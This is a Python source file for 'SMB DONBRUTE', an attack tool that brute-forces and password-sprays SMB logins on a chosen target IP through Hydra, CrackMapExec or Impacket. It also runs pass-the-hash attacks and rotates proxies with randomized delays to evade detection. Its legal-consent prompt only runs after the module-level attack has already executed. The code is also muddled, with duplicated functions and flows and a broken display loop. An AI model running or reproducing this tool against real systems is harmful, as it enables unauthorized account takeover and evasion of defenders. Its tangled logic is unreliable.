import os
import subprocess
import threading
from queue import Queue
import logging
import time
import multiprocessing  # For dynamic thread count
import random
from rich.console import Console
from rich.progress import Progress
from rich.layout import Layout
from rich.live import Live
import signal




# === ASCII BANNER ===
ascii_banner = r"""
 ██████  ██████  ███    ██ ██████  ██████  ██    ██ ████████ ████████ ███████ 
██      ██    ██ ████   ██ ██   ██ ██   ██ ██    ██    ██       ██    ██      
██      ██    ██ ██ ██  ██ ██   ██ ██   ██ ██    ██    ██       ██    █████   
██      ██    ██ ██  ██ ██ ██   ██ ██   ██ ██    ██    ██       ██    ██      
 ██████  ██████  ██   ████ ██████  ██████   ██████     ██       ██    ███████ 
                        SMB DONBRUTE - Optimized Brute Force Tool              
"""
print(ascii_banner)

# === SETUP LOGGING (Console and File) ===
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler("smb_donbrute.log", mode='a')
    ]
)

def get_input(prompt, valid_choices=None):
    while True:
        choice = input(prompt).strip()
        if valid_choices and choice not in valid_choices:
            logging.error("Invalid choice! Please try again.")
        else:
            return choice

# === CONFIGURATIONS ===
TARGET_IP = get_input("Enter the target IP: ")
SHARE_NAME = get_input("Enter the SMB share name: ")

# === USERLIST SELECTION ===
userlist_choice = get_input("Press 1 for the built-in userlist or 2 to provide the path to your userlist: ", ['1', '2'])
USERLIST_PATH = os.path.join(os.getcwd(), 'userlist.txt') if userlist_choice == '1' else get_input("Enter the path to the username list: ")

# === TOOL SELECTION ===
tool_choice = get_input("Press 'h' for Hydra, 'c' for CrackMapExec, 'i' for Impacket, or 'a' for all: ", ['h', 'c', 'i', 'a'])
TOOL = {'h': 'hydra', 'c': 'crackmapexec', 'i': 'impacket', 'a': 'all'}[tool_choice]

# === THREAD COUNT (Dynamic Enhancement) ===
default_threads = multiprocessing.cpu_count() * 2
thread_input = get_input(f"Enter thread count (default {default_threads}): ") or str(default_threads)
try:
    THREAD_COUNT = int(thread_input)
except ValueError:
    logging.warning("Invalid thread count input, using default.")
    THREAD_COUNT = default_threads

# === RATE LIMITING (Delay between attempts) ===
delay_input = get_input("Enter delay between attempts in seconds (default 0.5): ") or "0.5"
try:
    DELAY = float(delay_input)
except ValueError:
    logging.warning("Invalid delay input, using default 0.5 seconds.")
    DELAY = 0.5

# === WORDLIST SELECTION ===
wordlist_choice = get_input("Press 1 for the built-in wordlist or 2 to provide the path to your wordlist: ", ['1', '2'])
WORDLIST_PATH = os.path.join(os.getcwd(), 'wordlist.txt') if wordlist_choice == '1' else get_input("Enter the path to the password list: ")

# === PROXY/VPN CONFIGURATION (Placeholder) ===
# To route your traffic through a proxy/VPN, you might add an option here.
PROXY = ""  # Set to a proxy address (e.g., "http://127.0.0.1:8080") if needed.

# === CHECK FILES EXISTENCE ===
if not os.path.exists(USERLIST_PATH) or not os.path.exists(WORDLIST_PATH):
    logging.error("Userlist or wordlist file not found!")
    exit(1)

# === TOOL VERIFICATION FUNCTIONS ===
def is_tool_installed(tool_name):
    return subprocess.run(["which", tool_name], capture_output=True, text=True).stdout.strip() != ""

def get_tool_version(tool_name):
    try:
        result = subprocess.run([tool_name, "--version"], capture_output=True, text=True)
        if result.returncode == 0:
            logging.info(f"{tool_name} version: {result.stdout.strip()}")
    except Exception as e:
        logging.error(f"Error getting {tool_name} version: {e}")

if TOOL != "all" and not is_tool_installed(TOOL):
    logging.error(f"{TOOL} is not installed! Install it first.")
    exit(1)
if TOOL == "all":
    for tool in ['hydra', 'crackmapexec', 'impacket']:
        if is_tool_installed(tool):
            get_tool_version(tool)
else:
    get_tool_version(TOOL)

# === GLOBAL VARIABLES FOR SUCCESS DETECTION AND STATISTICS ===
found = threading.Event()  # Flag to stop all threads when credentials are found
attempt_count = 0
attempt_lock = threading.Lock()

# Advanced success detection keywords (can be further tuned)
SUCCESS_KEYWORDS = ["valid", "success", "pwned", "session established", "authenticated"]

def generate_command(username, password):
    """Generate the command based on the selected tool and proxy settings."""
    # Base commands for each tool.
    if TOOL == "hydra":
        cmd = ["hydra", "-l", username, "-p", password, f"smb://{TARGET_IP}", "-V"]
    elif TOOL == "crackmapexec":
        cmd = ["crackmapexec", "smb", TARGET_IP, "-u", username, "-p", password]
    elif TOOL == "impacket":
        cmd = ["smbclient.py", f"//{TARGET_IP}/{SHARE_NAME}", "-U", f"{username}%{password}"]
    else:  # If "all" is selected, default to hydra (or iterate through all tools)
        cmd = ["hydra", "-l", username, "-p", password, f"smb://{TARGET_IP}", "-V"]
    
    # If PROXY is set, append proxy settings (this is a placeholder—actual integration depends on tool support)
    if PROXY:
        cmd.extend(["--proxy", PROXY])
    return cmd

def brute_force(username, password):
    global attempt_count
    if found.is_set():
        return

    command = generate_command(username, password)
    try:
        # Adding a timeout for each subprocess call helps prevent hanging
        result = subprocess.run(command, capture_output=True, text=True, timeout=15)
    except subprocess.TimeoutExpired:
        logging.warning(f"Command timed out: {' '.join(command)}")
        time.sleep(DELAY)
        return
    except subprocess.SubprocessError as e:
        logging.error(f"Subprocess error: {e}")
        time.sleep(DELAY)
        return

    output = result.stdout.lower()
    if any(keyword in output for keyword in SUCCESS_KEYWORDS):
        logging.info(f"Found Credentials: {username}:{password}")
        with open("smb_brute_results.txt", "a") as f:
            f.write(f"{username}:{password}\n")
        found.set()  # Stop further attempts once credentials are found
    else:
        logging.debug(f"Attempt failed for {username}:{password}")

    with attempt_lock:
        attempt_count += 1
    time.sleep(DELAY)  # Rate limiting between attempts

# === LOAD CREDENTIALS INTO A QUEUE ===
queue = Queue()

try:
    with open(USERLIST_PATH, "r") as users:
        user_list = [user.strip() for user in users if user.strip()]
except IOError as e:
    logging.error(f"Error reading userlist file: {e}")
    exit(1)

try:
    with open(WORDLIST_PATH, "r", encoding="utf-8") as wordlist:
        password_list = [password.strip() for password in wordlist if password.strip()]
except UnicodeDecodeError:
    logging.warning(f"Error decoding {WORDLIST_PATH} with UTF-8, trying ISO-8859-1.")
    try:
        with open(WORDLIST_PATH, "r", encoding="ISO-8859-1") as wordlist:
            password_list = [password.strip() for password in wordlist if password.strip()]
    except Exception as e:
        logging.error(f"Error reading wordlist file with fallback encoding: {e}")
        exit(1)
except IOError as e:
    logging.error(f"Error reading wordlist file: {e}")
    exit(1)

for user in user_list:
    for password in password_list:
        queue.put((user, password))

# === WORKER FUNCTION FOR MULTI-THREADED BRUTE-FORCING ===
def worker():
    while not queue.empty() and not found.is_set():
        username, password = queue.get()
        logging.info(f"Trying {username}:{password}")
        brute_force(username, password)
        queue.task_done()

# === CREATE AND START THREADS ===
threads = []
for _ in range(THREAD_COUNT):
    t = threading.Thread(target=worker)
    t.start()
    threads.append(t)

for t in threads:
    t.join()

logging.info("Brute-force attack completed!")
logging.info(f"Total attempts: {attempt_count}")

# === ENHANCEMENTS PLACEHOLDERS ===

# 1. Distributed Brute-Force (Client-Server Model)
def start_distributed_mode():
    logging.info("Distributed brute-force mode activated.")
    # TODO: Implement client-server logic here.
    # For example, create a server that distributes chunks of the username/password queue
    # to multiple clients, collects results, and aggregates them.
    # This would likely involve network programming (e.g., using sockets or a higher-level framework).
    logging.info("Distributed mode not fully implemented yet.")

# 2. Graphical User Interface (GUI) for Configuration and Monitoring
def launch_gui():
    try:
        import tkinter as tk
        from tkinter import messagebox

        def start_attack():
            # In a full implementation, collect parameters from the GUI and start the brute-force attack.
            messagebox.showinfo("Info", "Starting attack... (GUI mode placeholder)")
            root.destroy()

        root = tk.Tk()
        root.title("SMB DONBRUTE GUI")
        tk.Label(root, text="SMB DONBRUTE - Optimized Brute Force Tool", font=("Arial", 14)).pack(pady=10)
        tk.Button(root, text="Start Attack", command=start_attack).pack(pady=20)
        root.mainloop()
    except ImportError:
        logging.error("Tkinter is not installed. Please install it to use the GUI mode.")

# 3. Proxy/VPN Support (Already partially integrated in command generation)
#    For a complete implementation, you might integrate with libraries that handle HTTP/SOCKS proxies,
#    or configure your network interface accordingly.

# 4. Automatic Report Generation
def generate_report():
    report_filename = "smb_donbrute_report.txt"
    try:
        with open(report_filename, "w") as report_file:
            report_file.write("SMB DONBRUTE Report\n")
            report_file.write("===================\n")
            report_file.write(f"Target IP: {TARGET_IP}\n")
            report_file.write(f"Share Name: {SHARE_NAME}\n")
            report_file.write(f"Tool Used: {TOOL}\n")
            report_file.write(f"Total Attempts: {attempt_count}\n")
            if found.is_set():
                report_file.write("Result: Credentials found. See smb_brute_results.txt for details.\n")
            else:
                report_file.write("Result: No valid credentials were found.\n")
        logging.info(f"Report generated: {report_filename}")
    except Exception as e:
        logging.error(f"Error generating report: {e}")

# === OPTIONAL: Choose to launch additional enhancements ===
enhancement_choice = get_input(
    "Choose additional mode: [d]istributed, [g]ui, [r]eport, or [n]one: ",
    ['d', 'g', 'r', 'n']
)

if enhancement_choice == 'd':
    start_distributed_mode()
elif enhancement_choice == 'g':
    launch_gui()
elif enhancement_choice == 'r':
    generate_report()
else:
    logging.info("No additional enhancements selected.")

# ==== GLOBAL CONFIG UPDATES ====
PROXY_LIST = []  # Populate from file or API
current_proxy = None
ETHICAL_MODE = False  # Stop after first valid credential

# ==== LEGAL COMPLIANCE CHECK ====
def compliance_check():
    consent = get_input("Do you have written authorization to attack this target? (y/n): ", ["y", "n"])
    if consent.lower() != "y":
        logging.error("Aborting: Legal consent not provided!")
        exit(0)

# ==== RANDOM DELAY GENERATOR ====
def random_delay():
    return random.uniform(0.1, DELAY*2)  # Randomize within 0.1 to 2*DELAY

# ==== PROXY ROTATION ====
def rotate_proxy():
    global current_proxy
    if PROXY_LIST:
        current_proxy = random.choice(PROXY_LIST)
        logging.debug(f"Rotated to proxy: {current_proxy}")

# ==== PASSWORD SPRAYING MODE ====
def password_spray_mode():
    with open(WORDLIST_PATH, "r") as f:
        passwords = [p.strip() for p in f.readlines()]
    
    for password in passwords:
        if found.is_set():
            break
        logging.info(f"[SPRAY] Testing password: {password}")
        for user in user_list:
            brute_force(user, password)
            time.sleep(random_delay())

# ==== HASH-BASED ATTACK (Pass-the-Hash) ====
def hash_attack(username, nthash):
    cmd = [
        "crackmapexec", "smb", TARGET_IP,
        "-u", username,
        "-H", nthash,
        "--share", SHARE_NAME
    ]
    result = subprocess.run(cmd, capture_output=True, text=True)
    if "PWNED" in result.stdout:
        logging.critical(f"Hash Valid! {username}:{nthash}")
        found.set()

# ==== INTERACTIVE TUI WITH RICH ====
console = Console()
layout = Layout()

def init_tui():
    layout.split(
        Layout(name="header", size=3),
        Layout(name="stats", size=5),
        Layout(name="progress", size=8),
        Layout(name="logs")
    )
    return layout

def update_tui(progress, stats):
    with Live(layout, refresh_per_second=4):
        layout["header"].update(
            f"[bold red]Target:[/] {TARGET_IP} [bold green]Threads:[/] {THREAD_COUNT}"
        )
        layout["stats"].update(stats)
        layout["progress"].update(progress)

# ==== SIGNAL HANDLER FOR CLEAN EXIT ====
def handler(_signum, _frame):
    logging.warning("CTRL-C Detected! Shutting down...")
    found.set()
    exit(0)

signal.signal(signal.SIGINT, handler)

# ==== HANDLE SUCCESS FUNCTION ====
def handle_success(username, password):
    logging.info(f"Found Credentials: {username}:{password}")
    with open("smb_brute_results.txt", "a") as f:
        f.write(f"{username}:{password}\n")
    found.set()  # Stop further attempts once credentials are found

# ==== UPDATED BRUTE_FORCE FUNCTION ====
def brute_force(username, password):
    global attempt_count
    if found.is_set() or (ETHICAL_MODE and attempt_count > 1000):
        return

    # Rotate proxy every 10 attempts
    if attempt_count % 10 == 0:
        rotate_proxy()

    cmd = generate_command(username, password)
    try:
        result = subprocess.run(
            cmd, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE,
            timeout=15,
            env={"http_proxy": current_proxy} if current_proxy else None
        )
    except Exception as e:
        logging.error(f"Command failed: {e}")
        return

    # Check for success (updated for hash detection)
    output = result.stdout.decode().lower()
    if any(keyword in output for keyword in SUCCESS_KEYWORDS + ["pwned"]):
        handle_success(username, password)
        
# ==== MAIN EXECUTION FLOW UPDATE ====
if __name__ == "__main__":
    compliance_check()  # Legal check first
    
    # Ask for attack mode
    attack_mode = get_input(
        "Choose mode: [b]rute-force, [s]pray, [h]ash: ",
        ["b", "s", "h"]
    )
    
    # Initialize TUI
    layout = init_tui()
    progress = Progress()
    stats = "[bold]Status:[/] Running\n[bold]Attempts:[/] 0"
    
    if attack_mode == "h":
        hash_list = get_input("Path to NT hash list: ")
        with open(hash_list) as f:
            for line in f:
                if found.is_set():
                    break
                user, nthash = line.strip().split(":")
                hash_attack(user, nthash)
    elif attack_mode == "s":
        password_spray_mode()
    else:
        # Original brute-force with threading
        for _ in range(THREAD_COUNT):
            t = threading.Thread(target=worker)
            t.start()
        
        # TUI Update Thread
        def tui_updater():
            while not found.is_set():
                stats = f"[bold]Found:[/] {found.is_set()}\n[bold]Attempts:[/] {attempt_count}"
                update_tui(progress, stats)
                time.sleep(0.5)
        
        threading.Thread(target=tui_updater, daemon=True).start()
        
        for t in threads:
            t.join()
